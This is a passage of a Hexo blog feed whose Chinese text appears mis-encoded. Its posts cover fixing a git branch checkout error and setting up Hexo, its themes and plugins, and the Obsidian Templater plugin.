class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><br><br><br><span class="hljs-meta">## æŠ¥é”™è§£å†³</span><br><br><span class="hljs-meta">### git checkout -b  xxx origin/xxx æŠ¥é”™</span><br><br>```bash<br>[<span class="hljs-meta">root@ningan dubhe</span>]<span class="hljs-meta"># git checkout -b dev_230109 origin/dev_230109</span><br>fatal: <span class="hljs-string">&#x27;origin/dev_230109&#x27;</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> a commit <span class="hljs-keyword">and</span> a branch <span class="hljs-string">&#x27;dev_230109&#x27;</span> cannot be created <span class="hljs-keyword">from</span> it<br><br>[<span class="hljs-meta">root@ningan dubhe</span>]<span class="hljs-meta"># git branch</span><br>* anwy-dev<br>  anwy-test<br>  master<br>  rc1<br>  rc2<br>  rc2<span class="hljs-number">-0.1</span><span class="hljs-number">.4</span><br>  rc2-testable<br>  rc2-testable2<br><br><br><span class="hljs-meta">## è§£å†³åŠæ³•</span><br>[<span class="hljs-meta">root@ningan dubhe</span>]<span class="hljs-meta"># git pull</span><br>remote: Enumerating objects: <span class="hljs-number">39</span>, done.<br>remote: Counting objects: <span class="hljs-number">100</span>% (<span class="hljs-number">39</span>/<span class="hljs-number">39</span>), done.<br>remote: Compressing objects: <span class="hljs-number">100</span>% (<span class="hljs-number">35</span>/<span class="hljs-number">35</span>), done.<br>remote: Total <span class="hljs-number">39</span> (delta <span class="hljs-number">12</span>), reused <span class="hljs-number">0</span> (delta <span class="hljs-number">0</span>), pack-reused <span class="hljs-number">0</span><br>Unpacking objects: <span class="hljs-number">100</span>% (<span class="hljs-number">39</span>/<span class="hljs-number">39</span>), done.<br>From http:<span class="hljs-comment">//gitlab.tianti.tg.unicom.local/cloudStorage/tgStack/dubhe</span><br> * [<span class="hljs-keyword">new</span> branch]      dev_230109 -&gt; origin/dev_230109<br>Already up to date.<br>[<span class="hljs-meta">root@ningan dubhe</span>]<span class="hljs-meta">#</span><br>[<span class="hljs-meta">root@ningan dubhe</span>]<span class="hljs-meta"># git branch</span><br>* anwy-dev<br>  anwy-test<br>  master<br>  rc1<br>  rc2<br>  rc2<span class="hljs-number">-0.1</span><span class="hljs-number">.4</span><br>  rc2-testable<br>  rc2-testable2<br>[<span class="hljs-meta">root@ningan dubhe</span>]<span class="hljs-meta">#</span><br>[<span class="hljs-meta">root@ningan dubhe</span>]<span class="hljs-meta"># git checkout -b dev_230109 origin/dev_230109</span><br>M       Makefile<br>M       config/cuk-config.cue<br>D       config/kubeconfig-n2<br>M       config/regionConfig.yaml<br>M       go.mod<br>M       go.sum<br>M       pkg/utils/common_vars_insert.go<br>M       pkg/utils/common_vars_insert_test.go<br>Branch <span class="hljs-string">&#x27;dev_230109&#x27;</span> <span class="hljs-keyword">set</span> up to track remote branch <span class="hljs-string">&#x27;dev_230109&#x27;</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;origin&#x27;</span>.<br>Switched to a <span class="hljs-keyword">new</span> branch <span class="hljs-string">&#x27;dev_230109&#x27;</span><br>[<span class="hljs-meta">root@ningan dubhe</span>]<span class="hljs-meta">#</span><br><br>[<span class="hljs-meta">root@ningan dubhe</span>]<span class="hljs-meta"># git branch</span><br>  anwy-dev<br>  anwy-test<br>* dev_230109<br>  master<br>  rc1<br>  rc2<br>  rc2<span class="hljs-number">-0.1</span><span class="hljs-number">.4</span><br>  rc2-testable<br>  rc2-testable2<br><br><br></code></pre></td></tr></table></figure><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://www.jianshu.com/p/811b07b129e8"># gitåŒæ­¥è¿œç¨‹ä»“åº“åˆ†æ”¯</a></p>]]></content>
    
    
    <categories>
      
      <category>git</category>
      
    </categories>
    
    
    <tags>
      
      <tag>git</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€obsidianç³»åˆ—ã€‘04.obsidianå¦‚ä½•æ’å…¥æ¨¡æ¿ï¼Ÿæ’ä»¶ï¼štemplater</title>
    <link href="/2022/12/11/obsidian/%E3%80%90obsidian%E7%B3%BB%E5%88%97%E3%80%9104.obsidian%E5%A6%82%E4%BD%95%E6%8F%92%E5%85%A5%E6%A8%A1%E6%9D%BF%EF%BC%9F%E6%8F%92%E4%BB%B6%EF%BC%9Atemplater/"/>
    <url>/2022/12/11/obsidian/%E3%80%90obsidian%E7%B3%BB%E5%88%97%E3%80%9104.obsidian%E5%A6%82%E4%BD%95%E6%8F%92%E5%85%A5%E6%A8%A1%E6%9D%BF%EF%BC%9F%E6%8F%92%E4%BB%B6%EF%BC%9Atemplater/</url>
    
    <content type="html"><![CDATA[<h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>æˆ‘åœ¨ä½¿ç”¨github.ioåˆ›ä½œè‡ªå·±çš„åšå®¢ï¼Œä½¿ç”¨äº†hexoä¸»é¢˜ï¼Œhexoä¸»é¢˜éœ€è¦æœ‰ä¸€äº›å…ƒæ•°æ®æ‰èƒ½æ­£ç¡®çš„è¯†åˆ«ï¼Œæƒ³é€šè¿‡obsidiançš„æ¨¡æ¿æ’ä»¶æ¥å®šåˆ¶ä¸€ä¸ªä¸“å±äºhexoå…ƒæ•°æ®çš„æ¨¡æ¿ã€‚</p><h2 id="æ“ä½œ"><a href="#æ“ä½œ" class="headerlink" title="æ“ä½œ"></a>æ“ä½œ</h2><h3 id="å®‰è£…æ’ä»¶"><a href="#å®‰è£…æ’ä»¶" class="headerlink" title="å®‰è£…æ’ä»¶"></a>å®‰è£…æ’ä»¶</h3><p>æ‰“å¼€æ’ä»¶<br>å·¦ä¸‹è§’è®¾ç½® â€“&gt; ç¬¬ä¸‰æ–¹æ’ä»¶ â€“&gt; ç¤¾åŒºæ’ä»¶å¸‚åœºï¼Œæœç´¢ï¼štemplater</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221211182120.png" alt="image.png"></p><p>ç‚¹å‡»å®‰è£…ï¼Œç„¶åå¯ç”¨ã€‚</p><h3 id="é…ç½®æ’ä»¶"><a href="#é…ç½®æ’ä»¶" class="headerlink" title="é…ç½®æ’ä»¶"></a>é…ç½®æ’ä»¶</h3><p>åœ¨ä»“åº“ä¸‹æ–°å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œéšæ„å–å</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221211182213.png" alt="image.png"></p><p>åœ¨æ’ä»¶çš„é…ç½®å¤„ï¼Œå°†åˆšåˆšçš„æ–‡ä»¶å¤¹å¡«ä¸Šã€‚</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221211182311.png" alt="image.png"></p><h3 id="å®šåˆ¶æ¨¡æ¿"><a href="#å®šåˆ¶æ¨¡æ¿" class="headerlink" title="å®šåˆ¶æ¨¡æ¿"></a>å®šåˆ¶æ¨¡æ¿</h3><p>å®šåˆ¶ä¸€ä¸ªhexoçš„å…ƒæ•°æ®æ¨¡æ¿</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221211182435.png" alt="image.png"></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">title:</span> &lt;%<span class="language-ruby"> tp.file.title </span>%&gt;<br><span class="hljs-attr">author:</span> <span class="hljs-string">ningan123</span><br><span class="hljs-attr">date:</span> &lt;%<span class="language-ruby"> tp.file.creation_date() </span>%&gt;<br><span class="hljs-attr">updated:</span> &lt;%<span class="language-ruby"> tp.file.last_modified_date() </span>%&gt;<br><span class="hljs-attr">tags:</span><br><span class="hljs-meta">---</span><br></code></pre></td></tr></table></figure><h3 id="æ–°å»ºç¬”è®°"><a href="#æ–°å»ºç¬”è®°" class="headerlink" title="æ–°å»ºç¬”è®°"></a>æ–°å»ºç¬”è®°</h3><p>æ­¤å¤„é€‰æ‹©ä¸€ä¸ªä¹‹å‰å°±åˆ›å»ºçš„ç¬”è®°ï¼Œç‚¹å‡»å·¦ä¾§templaterçš„æ¨¡æ¿ï¼Œé€‰æ‹©åˆšåˆšå»ºçš„æ¨¡æ¿hexo</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221211182702.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221211182729.png" alt="image.png"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œå·²ç»åŠ¨æ€ç”Ÿæˆäº†æ¨¡æ¿æ•°æ®<br>ä¹‹æ‰€ä»¥è¦é€‰æ‹©ä¹‹å‰å°±å»ºå¥½çš„ç¬”è®°ï¼Œæ˜¯å› ä¸ºæƒ³ä½“ç°å‡ºæ’ä»¶çš„creation_dateå’Œlast_modified_dateçš„åŒºåˆ«ã€‚<br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221211182754.png" alt="image.png"></p><p>è¿˜å¯ä»¥å®šåˆ¶å…¶ä»–è‡ªå·±æƒ³è¦çš„æ•°æ®ï¼Œå¯ä»¥åˆ°<a href="https://silentvoid13.github.io/Templater/">Templater</a>è¿›è¡ŒæŸ¥çœ‹å…¶ä»–è¯­æ³•çš„ç”Ÿæˆã€‚</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://silentvoid13.github.io/Templater/">Templater</a></p>]]></content>
    
    
    <categories>
      
      <category>obsidian</category>
      
    </categories>
    
    
    <tags>
      
      <tag>obsidian</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€hexoç³»åˆ—ã€‘02.hexoå’Œobsidianå®ç°ç¬”è®°ä¸æ»‘</title>
    <link href="/2022/12/11/hexo/%E3%80%90hexo%E7%B3%BB%E5%88%97%E3%80%9102.hexo%E5%92%8Cobsidian%E5%AE%9E%E7%8E%B0%E7%AC%94%E8%AE%B0%E4%B8%9D%E6%BB%91/"/>
    <url>/2022/12/11/hexo/%E3%80%90hexo%E7%B3%BB%E5%88%97%E3%80%9102.hexo%E5%92%8Cobsidian%E5%AE%9E%E7%8E%B0%E7%AC%94%E8%AE%B0%E4%B8%9D%E6%BB%91/</url>
    
    <content type="html"><![CDATA[<h2 id="hexoä¸»é¢˜"><a href="#hexoä¸»é¢˜" class="headerlink" title="hexoä¸»é¢˜"></a>hexoä¸»é¢˜</h2><p><a href="https://hexo.io/themes/">hexoä¸»é¢˜å¤§å…¨</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> blog<br>git <span class="hljs-built_in">clone</span> https://github.com/yelog/hexo-theme-3-hexo.git themes/3-hexo<br></code></pre></td></tr></table></figure><p>è¿™æ˜¯å°†3-hexoä¸»é¢˜ä¸‹è½½åˆ°blogç›®å½•çš„themesä¸»é¢˜ä¸‹çš„3-hexoæ–‡ä»¶å¤¹ä¸­ã€‚</p><p>æ‰“å¼€åšå®¢ç›®å½•ä¸‹çš„_config.ymlé…ç½®æ–‡ä»¶ï¼Œä¿®æ”¹ä¸»é¢˜ä¸º3-hexo</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210215012.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo clean<br>hexo g<br>hexo d<br></code></pre></td></tr></table></figure><p>æ•ˆæœå¦‚ä¸‹ï¼š<br>(ä¿®æ”¹äº†éƒ¨åˆ†é…ç½®æ•°æ®ï¼Œæ²¡æœ‰åœ¨åšå®¢é‡Œå†™å‡ºæ¥)</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210215159.png"></p><h2 id="hexoè¿›é˜¶"><a href="#hexoè¿›é˜¶" class="headerlink" title="hexoè¿›é˜¶"></a>hexoè¿›é˜¶</h2><h3 id="hexoæ’ä»¶ï¼šè‡ªåŠ¨ç”Ÿæˆç›®å½•"><a href="#hexoæ’ä»¶ï¼šè‡ªåŠ¨ç”Ÿæˆç›®å½•" class="headerlink" title="hexoæ’ä»¶ï¼šè‡ªåŠ¨ç”Ÿæˆç›®å½•"></a>hexoæ’ä»¶ï¼šè‡ªåŠ¨ç”Ÿæˆç›®å½•</h3><p>æƒ³è¦è‡ªåŠ¨ç”Ÿæˆç›®å½•</p><p>åŸå§‹çš„æ–‡ç« ç›®å½•æ ¼å¼å¦‚ä¸‹ï¼Œæ–‡ç« çš„åŸæ•°æ®å¦‚ä¸‹å³</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210230720.png"></p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">npm install hexo-auto-category <span class="hljs-attr">--save</span><br></code></pre></td></tr></table></figure><p>é…ç½® HexoÂ <code>_config.yml</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Generate categories from directory-tree</span><br><span class="hljs-comment"># Dependencies: https://github.com/xu-song/hexo-auto-category</span><br><span class="hljs-comment"># depth: the max_depth of directory-tree you want to generate, should &gt; 0</span><br>auto_category:<br> <span class="hljs-built_in">enable</span>: <span class="hljs-literal">true</span><br> depth:<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æœ¬åœ°é¢„è§ˆ</span><br>hexo clean &amp;&amp; hexo g &amp;&amp; hexo s<br><span class="hljs-comment"># github</span><br>hexo clean &amp;&amp; hexo g &amp;&amp; hexo d<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°categoriesç›®å½•å·²ç»è‡ªåŠ¨æ·»åŠ ä¸Šäº†</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210231121.png"></p><h3 id="hexoæ’ä»¶ï¼šè‡ªåŠ¨ç”Ÿæˆç›®å½•åºå·ï¼ˆè‡ªè¡Œé€‰ç”¨ï¼‰"><a href="#hexoæ’ä»¶ï¼šè‡ªåŠ¨ç”Ÿæˆç›®å½•åºå·ï¼ˆè‡ªè¡Œé€‰ç”¨ï¼‰" class="headerlink" title="hexoæ’ä»¶ï¼šè‡ªåŠ¨ç”Ÿæˆç›®å½•åºå·ï¼ˆè‡ªè¡Œé€‰ç”¨ï¼‰"></a>hexoæ’ä»¶ï¼šè‡ªåŠ¨ç”Ÿæˆç›®å½•åºå·ï¼ˆè‡ªè¡Œé€‰ç”¨ï¼‰</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210232941.png"></p><p>é…ç½® HexoÂ <code>_config.yml</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æ’ä»¶ hexo-heading-index è‡ªåŠ¨ç”Ÿæˆæ ‡é¢˜åºå·</span><br>heading_index:<br>  <span class="hljs-built_in">enable</span>: <span class="hljs-literal">true</span><br>  index_styles: <span class="hljs-string">&quot;&#123;1&#125; &#123;1&#125; &#123;1&#125; &#123;1&#125; &#123;1&#125; &#123;1&#125;&quot;</span><br>  connector: <span class="hljs-string">&quot;.&quot;</span><br>  global_prefix: <span class="hljs-string">&quot;&quot;</span><br>  global_suffix: <span class="hljs-string">&quot;. &quot;</span><br>  start_level: 1<br>  allow_html: <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210235534.png"></p><h3 id="obsidianæ’ä»¶ï¼štemplater"><a href="#obsidianæ’ä»¶ï¼štemplater" class="headerlink" title="obsidianæ’ä»¶ï¼štemplater"></a>obsidianæ’ä»¶ï¼štemplater</h3><h4 id="å®‰è£…æ’ä»¶"><a href="#å®‰è£…æ’ä»¶" class="headerlink" title="å®‰è£…æ’ä»¶"></a>å®‰è£…æ’ä»¶</h4><p>æ‰“å¼€æ’ä»¶<br>å·¦ä¸‹è§’è®¾ç½® â€“&gt; ç¬¬ä¸‰æ–¹æ’ä»¶ â€“&gt; ç¤¾åŒºæ’ä»¶å¸‚åœºï¼Œæœç´¢ï¼štemplater</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221211182120.png" alt="image.png"></p><p>ç‚¹å‡»å®‰è£…ï¼Œç„¶åå¯ç”¨ã€‚</p><h4 id="é…ç½®æ’ä»¶"><a href="#é…ç½®æ’ä»¶" class="headerlink" title="é…ç½®æ’ä»¶"></a>é…ç½®æ’ä»¶</h4><p>åœ¨ä»“åº“ä¸‹æ–°å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œéšæ„å–å</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221211182213.png" alt="image.png"></p><p>åœ¨æ’ä»¶çš„é…ç½®å¤„ï¼Œå°†åˆšåˆšçš„æ–‡ä»¶å¤¹å¡«ä¸Šã€‚</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221211182311.png" alt="image.png"></p><h4 id="å®šåˆ¶æ¨¡æ¿"><a href="#å®šåˆ¶æ¨¡æ¿" class="headerlink" title="å®šåˆ¶æ¨¡æ¿"></a>å®šåˆ¶æ¨¡æ¿</h4><p>å®šåˆ¶ä¸€ä¸ªhexoçš„å…ƒæ•°æ®æ¨¡æ¿</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221211182435.png" alt="image.png"></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">title:</span> &lt;%<span class="language-ruby"> tp.file.title </span>%&gt;<br><span class="hljs-attr">author:</span> <span class="hljs-string">ningan123</span><br><span class="hljs-attr">date:</span> &lt;%<span class="language-ruby"> tp.file.creation_date() </span>%&gt;<br><span class="hljs-attr">updated:</span> &lt;%<span class="language-ruby"> tp.file.last_modified_date() </span>%&gt;<br><span class="hljs-attr">tags:</span><br><span class="hljs-meta">---</span><br></code></pre></td></tr></table></figure><h4 id="æ–°å»ºç¬”è®°"><a href="#æ–°å»ºç¬”è®°" class="headerlink" title="æ–°å»ºç¬”è®°"></a>æ–°å»ºç¬”è®°</h4><p>æ­¤å¤„é€‰æ‹©ä¸€ä¸ªä¹‹å‰å°±åˆ›å»ºçš„ç¬”è®°ï¼Œç‚¹å‡»å·¦ä¾§templaterçš„æ¨¡æ¿ï¼Œé€‰æ‹©åˆšåˆšå»ºçš„æ¨¡æ¿hexo</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221211182702.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221211182729.png" alt="image.png"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œå·²ç»åŠ¨æ€ç”Ÿæˆäº†æ¨¡æ¿æ•°æ®<br>ä¹‹æ‰€ä»¥è¦é€‰æ‹©ä¹‹å‰å°±å»ºå¥½çš„ç¬”è®°ï¼Œæ˜¯å› ä¸ºæƒ³ä½“ç°å‡ºæ’ä»¶çš„creation_dateå’Œlast_modified_dateçš„åŒºåˆ«ã€‚<br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221211182754.png" alt="image.png"></p><p>è¿˜å¯ä»¥å®šåˆ¶å…¶ä»–è‡ªå·±æƒ³è¦çš„æ•°æ®ï¼Œå¯ä»¥åˆ°<a href="https://silentvoid13.github.io/Templater/">Templater</a>è¿›è¡ŒæŸ¥çœ‹å…¶ä»–è¯­æ³•çš„ç”Ÿæˆã€‚</p><p>æ­é…åˆšåˆšhexoåŠ¨æ€ç”Ÿæˆç›®å½•çš„æ’ä»¶ï¼Œå¯ä»¥å®ç°å…ƒæ•°æ®è‡ªåŠ¨åŒ–ï¼Œæ˜¯ä¸æ˜¯çˆ½æ­ªæ­ª~â€”</p><h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><p><a href="https://github.com/xu-song/hexo-auto-category"># hexo-auto-category</a><br><a href="https://github.com/r12f/hexo-heading-index">hexo-heading-index</a><br><a href="https://silentvoid13.github.io/Templater/">Templater</a></p>]]></content>
    
    
    <categories>
      
      <category>hexo</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hexo</tag>
      
      <tag>obsidian</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€hexoç³»åˆ—ã€‘01.hexoç¯å¢ƒæ­å»ºåŠgithub.ioæ­å»º</title>
    <link href="/2022/12/10/hexo/%E3%80%90hexo%E7%B3%BB%E5%88%97%E3%80%9101.hexo%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8Agithub.io%E6%90%AD%E5%BB%BA/"/>
    <url>/2022/12/10/hexo/%E3%80%90hexo%E7%B3%BB%E5%88%97%E3%80%9101.hexo%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8Agithub.io%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h2 id="åŸºç¡€ç¯å¢ƒè¦æ±‚"><a href="#åŸºç¡€ç¯å¢ƒè¦æ±‚" class="headerlink" title="åŸºç¡€ç¯å¢ƒè¦æ±‚"></a>åŸºç¡€ç¯å¢ƒè¦æ±‚</h2><p>æ£€æµ‹Node.jsæ˜¯å¦å®‰è£…æˆåŠŸï¼Œåœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥ node -v<br>æ£€æµ‹npmæ˜¯å¦å®‰è£…æˆåŠŸï¼Œåœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥npm -v<br>å› ä¸ºæˆ‘ä¹‹å‰å®‰è£…è¿‡</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210135641.png"></p><h2 id="å®‰è£…hexo"><a href="#å®‰è£…hexo" class="headerlink" title="å®‰è£…hexo"></a>å®‰è£…hexo</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># å®‰è£…</span><br>npm install -g hexo-cli<br><span class="hljs-comment"># å®‰è£…ä¹‹åéªŒè¯</span><br>hexo --version<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210140201.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210140817.png"></p><h2 id="hexoåˆä½“éªŒ"><a href="#hexoåˆä½“éªŒ" class="headerlink" title="hexoåˆä½“éªŒ"></a>hexoåˆä½“éªŒ</h2><p>æˆ‘çš„ç¬”è®°æ ¹ç›®å½•æ˜¯ E:\SynologyDrive</p><h3 id="åˆ›å»ºhexoå·¥ç¨‹"><a href="#åˆ›å»ºhexoå·¥ç¨‹" class="headerlink" title="åˆ›å»ºhexoå·¥ç¨‹"></a>åˆ›å»ºhexoå·¥ç¨‹</h3><p>æ–¹æ³•1ï¼šåœ¨æ ¹ç›®å½•ä¸‹æ“ä½œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo init blog<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210141059.png"></p><p>å°±èƒ½çœ‹åˆ°ç”Ÿæˆäº†ä¸€ä¸ªå«blogçš„æ–‡ä»¶å¤¹</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210141234.png"></p><p>æ–¹æ³•2ï¼šæ–°å»ºä¸€ä¸ªblogæ–‡ä»¶å¤¹(è‡ªå·±æ›´æ”¹ä¸ºè‡ªå·±çš„åå­—)</p><p>è¿›åˆ°blogæ–‡ä»¶å¤¹ä¸‹é¢ï¼Œæ‰§è¡Œï¼š</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">hexo <span class="hljs-keyword">init</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210141358.png"></p><p>è¿™ä¸¤ä¸ªçš„æ•ˆæœæ˜¯ä¸€æ ·çš„ï¼Œæ‰§è¡Œä¹‹åå°±ä¼šçœ‹åˆ°blogæ–‡ä»¶å¤¹ä¸‹é¢æ‹‰å–äº†gitä¸Šé¢çš„ä¸œè¥¿ï¼Œå…·ä½“å¦‚ä¸‹ï¼š</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210141459.png"></p><h3 id="åˆä½“éªŒ"><a href="#åˆä½“éªŒ" class="headerlink" title="åˆä½“éªŒ"></a>åˆä½“éªŒ</h3><p>source&#x2F;_posts æ–‡ç« æ–‡ä»¶å¤¾</p><p>æ‰“å¼€è¯¥æ–‡ä»¶å¤¹ï¼Œå¯ä»¥çœ‹åˆ°ä¸‹é¢æœ‰ä¸€ä¸ªå«hello-world.mdçš„æ–‡æ¡£</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210142337.png"></p><p>å¯åŠ¨hexo serverï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo server<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210142451.png"></p><p>åœ¨æµè§ˆå™¨è®¿é—®è¿™ä¸ªç½‘å€ï¼š</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210142606.png"></p><p>å°±èƒ½çœ‹åˆ°ä¸Šé¢çš„é¡µé¢å•¦~</p><h3 id="åˆ›å»ºè‡ªå·±çš„ç¬¬ä¸€ç¯‡ç¬”è®°"><a href="#åˆ›å»ºè‡ªå·±çš„ç¬¬ä¸€ç¯‡ç¬”è®°" class="headerlink" title="åˆ›å»ºè‡ªå·±çš„ç¬¬ä¸€ç¯‡ç¬”è®°"></a>åˆ›å»ºè‡ªå·±çš„ç¬¬ä¸€ç¯‡ç¬”è®°</h3><p>æ‰§è¡Œï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æ–°å»ºä¸€ç¯‡æ–‡ç« </span><br>hexo new <span class="hljs-string">&quot;first&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210142757.png"></p><p>å¯ä»¥åœ¨ source&#x2F;_posts æ–‡ä»¶å¤¹ä¸‹çœ‹åˆ°åˆšåˆšæ–°å»ºçš„æ–‡ä»¶</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221210142851.png"></p><p>åœ¨ç¬”è®°ä¸­æ·»åŠ ä¸€äº›å†…å®¹ï¼Œå¹¶æŸ¥çœ‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;first article&quot;</span> &gt;&gt; first.md<br><span class="hljs-built_in">cat</span> .\first.md<br></code></pre></td></tr></table></figure><p><img 